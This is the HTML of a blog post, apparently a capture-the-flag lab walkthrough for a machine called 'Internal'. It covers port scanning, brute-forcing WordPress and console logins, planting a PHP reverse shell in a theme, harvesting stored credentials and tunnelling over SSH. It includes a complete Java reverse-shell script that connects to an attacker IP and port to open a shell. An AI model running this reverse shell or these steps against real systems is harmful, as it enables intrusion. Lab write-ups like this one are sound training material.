@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="InternalDifficulty: HighScore: 8.5&#x2F;10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Internal">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[11].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="InternalDifficulty: HighScore: 8.5&#x2F;10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgDULpRZhHjZffWIZs0-kWa5Ax50.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvBvlsmyVbRsNxjCMOe9pUjq7Gfe.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1UicDZEM0PnNd4bTVPjg03Oqlv.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrtIn_K7ZPoklyJzpZ_xSCaSHS60.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn66JgxWUWnlSVo6gU6DNhVVjlPK.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuIYKdl2fhv6euwL0oAWVaLqHIyZ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FutQES9UcWsmByaP8r-caHhshi32.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtX4gm2SN4ToBuBEH8u2Dp8hmfF1.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkeeaELWv00ePmjly3GV2CoSGGD0.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FucFgwAEs0YFc5ZfXCt6aDvV_8m-.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsiSRyIQ4MyIaGRRKgWK6Y2WRXB6.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjD58t6BIywVoCYg5rsuAbMQ4QKo.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg0zHLKh7E1nvussEL5wr2k4MWTk.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhvL-geTzSEulvRnokoQ5fm1TGw5.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgIrZredoOFQ9qKiUcAz7mkGXv0u.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft8WdOMEEtEVuKlaLz4M7-R32LfY.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqEMwqXZUKO7-otgPAmvsuCq84vw.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmJiWPpitm3HDdYAxjiMezDDi3xe.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrKKMX19tLTpUwF_uFHCArkUBL2Z.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjR9VHDByh5d7rgeIEQUn2lVYr-s.png">
+<meta property="article:published_time" content="2022-01-25T22:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.254Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penetration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgDULpRZhHjZffWIZs0-kWa5Ax50.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Internal</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B12%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B10%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[11].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&text=HTB Internal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&is_video=false&description=HTB Internal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Internal&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[11].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&name=HTB Internal&description=&lt;h1 id=&#34;Internal&#34;&gt;&lt;a href=&#34;#Internal&#34; class=&#34;headerlink&#34; title=&#34;Internal&#34;&gt;&lt;/a&gt;Internal&lt;/h1&gt;&lt;p&gt;Difficulty: High&lt;br&gt;Score: 8.5&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[11].html&t=HTB Internal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Internal"><span class="toc-number">1.</span> <span class="toc-text">Internal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Replace-the-website-elements-words"><span class="toc-number">3.2.</span> <span class="toc-text">Replace the website-elements words</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">3.3.</span> <span class="toc-text">Get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#infomation-collection"><span class="toc-number">3.3.1.</span> <span class="toc-text">infomation collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-in-as-aubreanna-via-ssh"><span class="toc-number">3.3.2.</span> <span class="toc-text">Login in as aubreanna via ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-in-as-root"><span class="toc-number">3.3.3.</span> <span class="toc-text">Login in as root</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Internal
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-25T22:18:00.000Z" class="dt-published" itemprop="datePublished">2022-01-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h1><p>Difficulty: High<br>Score: 8.5&#x2F;10</p>
+<hr>
+<span id="more"></span>
+
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
+<li>2 flags</li>
+<li>root privilege</li>
+<li>docker escalation</li>
+</ol>
+<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Nmap Scan output</p>
+<pre class="line-numbers language-none"><code class="language-none"># Nmap 7.92 scan initiated Wed Jan 26 00:57:36 2022 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.197.139 10.10.197.139
+Nmap scan report for 10.10.197.139
+Host is up (0.24s latency).
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+# Nmap done at Wed Jan 26 00:58:07 2022 -- 1 IP address (1 host up) scanned in 31.03 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Replace-the-website-elements-words"><a href="#Replace-the-website-elements-words" class="headerlink" title="Replace the website-elements words"></a>Replace the website-elements words</h2><p>We check out the 80 port, it can’t load normally.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgDULpRZhHjZffWIZs0-kWa5Ax50.png"><br>Inspect the elements, we found the interested things<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvBvlsmyVbRsNxjCMOe9pUjq7Gfe.png"><br>All of things is loading to internal.thm, we can’t access internal.thm from local machine. We can use the brupsuite to match the key-word and replace them to IP address.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1UicDZEM0PnNd4bTVPjg03Oqlv.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrtIn_K7ZPoklyJzpZ_xSCaSHS60.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts
+<span class="token function">add</span> the below information
+<span class="token number">10.10</span>.19.247 internal.thm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>ok it can load normally. Wordpress application, default login path &#x2F;wp-login.php<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn66JgxWUWnlSVo6gU6DNhVVjlPK.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuIYKdl2fhv6euwL0oAWVaLqHIyZ.png"><br>We can login with bruteforce. I used the burpsuite intruder module→ the password is my2boys</p>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>After we login, we can modify the theme code to add mailcious code (reverse_shell code) in it.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FutQES9UcWsmByaP8r-caHhshi32.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtX4gm2SN4ToBuBEH8u2Dp8hmfF1.png"><br>ok we connect it by the php-reverse-shell code<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkeeaELWv00ePmjly3GV2CoSGGD0.png"></p>
+<h3 id="infomation-collection"><a href="#infomation-collection" class="headerlink" title="infomation collection"></a>infomation collection</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FucFgwAEs0YFc5ZfXCt6aDvV_8m-.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /opt/wp-save.txt
+Bill,
+Aubreanna needed these credentials <span class="token keyword">for</span> something later.  Let her know you have them and where they are.
+aubreanna:bubb13guM<span class="token operator">!</span>@<span class="token comment">#123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Login-in-as-aubreanna-via-ssh"><a href="#Login-in-as-aubreanna-via-ssh" class="headerlink" title="Login in as aubreanna via ssh"></a>Login in as aubreanna via ssh</h3><p>Pay more attention on IP address for docker0, we have to pen Intranet<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsiSRyIQ4MyIaGRRKgWK6Y2WRXB6.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjD58t6BIywVoCYg5rsuAbMQ4QKo.png"><br>We can make the tunnel by ssh, to connect the intranet.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg0zHLKh7E1nvussEL5wr2k4MWTk.png"><br>ok we access <a target="_blank" rel="noopener" href="http://localhost:8081/">http://localhost:8081</a><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhvL-geTzSEulvRnokoQ5fm1TGw5.png"><br>We use the burpsuite to crack the password, the password is spongebob<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgIrZredoOFQ9qKiUcAz7mkGXv0u.png"><br>We can execute the script by the script console ( Java-Reverse-Shell )<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft8WdOMEEtEVuKlaLz4M7-R32LfY.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqEMwqXZUKO7-otgPAmvsuCq84vw.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> host<span class="token operator">=</span><span class="token string">"10.11.61.17"</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">4446</span><span class="token punctuation">;</span>
+<span class="token class-name">String</span> cmd<span class="token operator">=</span><span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>
+<span class="token class-name">Process</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Socket</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> pi<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pe<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> si<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">OutputStream</span> po<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmJiWPpitm3HDdYAxjiMezDDi3xe.png"></p>
+<h3 id="Login-in-as-root"><a href="#Login-in-as-root" class="headerlink" title="Login in as root"></a>Login in as root</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrKKMX19tLTpUwF_uFHCArkUBL2Z.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjR9VHDByh5d7rgeIEQUn2lVYr-s.png"></p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Internal"><span class="toc-number">1.</span> <span class="toc-text">Internal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Replace-the-website-elements-words"><span class="toc-number">3.2.</span> <span class="toc-text">Replace the website-elements words</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">3.3.</span> <span class="toc-text">Get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#infomation-collection"><span class="toc-number">3.3.1.</span> <span class="toc-text">infomation collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-in-as-aubreanna-via-ssh"><span class="toc-number">3.3.2.</span> <span class="toc-text">Login in as aubreanna via ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-in-as-root"><span class="toc-number">3.3.3.</span> <span class="toc-text">Login in as root</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[11].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&text=HTB Internal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&is_video=false&description=HTB Internal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Internal&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[11].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&title=HTB Internal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[11].html&name=HTB Internal&description=&lt;h1 id=&#34;Internal&#34;&gt;&lt;a href=&#34;#Internal&#34; class=&#34;headerlink&#34; title=&#34;Internal&#34;&gt;&lt;/a&gt;Internal&lt;/h1&gt;&lt;p&gt;Difficulty: High&lt;br&gt;Score: 8.5&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[11].html&t=HTB Internal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
